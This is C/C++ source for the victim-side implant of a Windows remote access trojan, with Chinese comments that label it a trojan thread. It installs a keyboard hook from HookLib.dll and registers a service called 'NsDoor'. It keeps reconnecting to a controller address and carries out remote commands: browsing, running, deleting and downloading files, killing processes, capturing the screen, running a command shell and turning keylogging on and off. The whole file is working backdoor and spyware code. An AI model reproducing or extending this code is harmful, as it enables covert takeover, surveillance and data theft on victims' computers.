#pragma once
#include "Header.h"
#include "RatProto.h"
#include "SysInfo.h"
#include "ProcInfo.h"
#include "RemoteCmd.h"
#include "FileMgr.h"
#include "DeskView.h"
#include "KeyBoard.h"

//////////////////////////////////////////////////////////////////////////
//宏定义部分
//////////////////////////////////////////////////////////////////////////
char szRecvCmd[MAXLENGTH] = {0};
char szSendCmd[MAXLENGTH] = {0};
int dwRecvSize = 0;
int dwSendSize = 0;
STARTHOOK StartHook = NULL;
STOPHOOK  StopHook = NULL;
GETTEXT	 GetText   = NULL;

void main(int argc, char* argv[]) 
{
	HMODULE hModule = LoadLibrary("HookLib.dll");
	if (hModule)
	{
		StartHook = (STARTHOOK)GetProcAddress(hModule,"StartHook");
		StopHook = (STOPHOOK)GetProcAddress(hModule,"StopHook");
		GetText  = (GETTEXT)GetProcAddress(hModule,"GetText");
		if (StopHook && StartHook && GetText)
		{
			StartHook();
		}
	}
	//创建一个木马线程
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);

	while (TRUE)
	{
		Sleep(1000);
	}
}


int ServiceMain()
{
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "NsDoor";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;

	// 启动服务的控制分派机线程
	StartServiceCtrlDispatcher(ServiceTable); 


	return 0;
}

//////////////////////////////////////////////////////////////////////////
//木马线程
//////////////////////////////////////////////////////////////////////////
void TrojanThread(void)
{
	//连接客户端
	SOCKET sockfd = ConnClient();

	while (TRUE)
	{
		//接收一个包
		BOOL flag = RecvCmd(sockfd);
		if (flag)
		{
			flag = DispatchCmd(sockfd,dwRecvSize);
			dwRecvSize = 0;
		}
		if (!flag)
		{
			SocketError(sockfd);
		}
	}
}






//////////////////////////////////////////////////////////////////////////
//连接客户端
//////////////////////////////////////////////////////////////////////////
SOCKET ConnClient(void)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	SOCKADDR_IN sin;
	sin.sin_addr.s_addr = inet_addr(DESTIP);
	sin.sin_port = htons(DESTPORT);
	sin.sin_family = AF_INET;
	SOCKET sockfd = socket(AF_INET,SOCK_STREAM,NULL);

	while (TRUE)
	{
		Sleep(100);
		int nRet = connect(sockfd,(LPSOCKADDR)&sin,sizeof(sin));
		if (nRet!=SOCKET_ERROR)
		{
			break;
		}
	}

	return sockfd;
}


//////////////////////////////////////////////////////////////////////////
//接收命令
//////////////////////////////////////////////////////////////////////////
BOOL RecvCmd(SOCKET sockfd)
{
	dwRecvSize = 0;
	//接收数据包头
	BOOL flag = RecvData(sockfd,szRecvCmd,sizeof(RatProto));
	if (!flag)
	{
		return FALSE;
	}
	else if (sizeof(RatProto) > ((RatProto*)szRecvCmd)->RatLen)
	{
		return FALSE;
	}
	//接收内容
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	if (dwSize)
	{
		char* pData = szRecvCmd + sizeof(RatProto);
		flag = RecvData(sockfd,pData,dwSize);
		if (!flag)
		{
			return FALSE;
		}
	}
	dwRecvSize = ((RatProto*)szRecvCmd)->RatLen;

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//SOCKET ERROR
//////////////////////////////////////////////////////////////////////////
BOOL SocketError(SOCKET sockfd)
{
	//TODO...
	dwSendSize = dwRecvSize = 0;
	closesocket(sockfd);
	//重新开一个木马线程
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);
	
	ExitThread(NULL);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//控制接收固定长度数据
//////////////////////////////////////////////////////////////////////////
BOOL RecvData(SOCKET sockfd,char* pData,int dwSize)
{
	while (TRUE)
	{
		fd_set fdset;
		fdset.fd_count = 1;
		fdset.fd_array[0] = sockfd;
		int nRet = select(NULL,&fdset,NULL,NULL,NULL);
		if (nRet == SOCKET_ERROR)
		{
			return FALSE;
		}
		else
		{
			nRet = recv(sockfd,pData,dwSize,NULL);
			if (nRet==SOCKET_ERROR || !nRet)
			{
				return FALSE;
			}
		}
		if (nRet < dwSize)
		{
			pData += nRet;
			dwSize -= nRet;
		}
		else
		{
			break;
		}
	}

	return TRUE;
}




//////////////////////////////////////////////////////////////////////////
//包分发机制
//////////////////////////////////////////////////////////////////////////
BOOL DispatchCmd(SOCKET sockfd,int dwSize)
{
	switch (((RatProto*)szRecvCmd)->RatId)
	{
	case FILE_VIEW:
		{
			//列盘符
			DriveList(sockfd);
		}
		break;
	case FILE_OPEN:
		{
			//打开指定文件
			FileOpen(sockfd,dwSize);
		}
		break;
	case FILE_EXCUTE:
		{
			//执行EXE文件
			FileExcute(sockfd,dwSize);
		}
		break;
	case FILE_BACK:
		{
			//文件夹回溯
			FileBack(sockfd,dwSize);
		}
		break;
	case FILE_DELETE:
		{
			//删除文件
			FileDelete(sockfd,dwSize);
		}
		break;
	case FILE_DOWNLOAD:
		{
			//下载文件
			FileDownload(sockfd,dwSize);
		}
		break;
	case PROC_VIEW:
		{
			//PROCVIEW函数
			ProcView(sockfd,dwSize);
		}
		break;
	case PROC_DELETE:
		{
			//删除PID指定进程
			ProcDelete(sockfd,dwSize);
		}
		break;
	case DESK_VIEW:
		{
			//远程桌面捕获
			DeskView(sockfd);
		}
		break;
	case CMD_REQUSET:
		{
			//响应CMD消息
			CmdReply(sockfd,dwSize);
		}
		break;
	case KEY_OK:
		{
			//开启键盘监控
			Start2Hook(sockfd);
		}
		break;
	case KEY_CANCEL:
		{
			//关闭键盘监控
			Stop2Hook(sockfd);
			
		}
		break;
	case SYS_VIEW:
		{
			//SYSINFO相关函数
			SysView(sockfd,dwSize);
		}
		break;
	default:
		return FALSE;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//发送命令
//////////////////////////////////////////////////////////////////////////
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize)
{
	int nRet = send(sockfd,pData,dwSize,NULL);
	//全部使用malloc分配,需释放
	//free(pData);
	if (nRet == SOCKET_ERROR)
	{
		SocketError(sockfd);
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}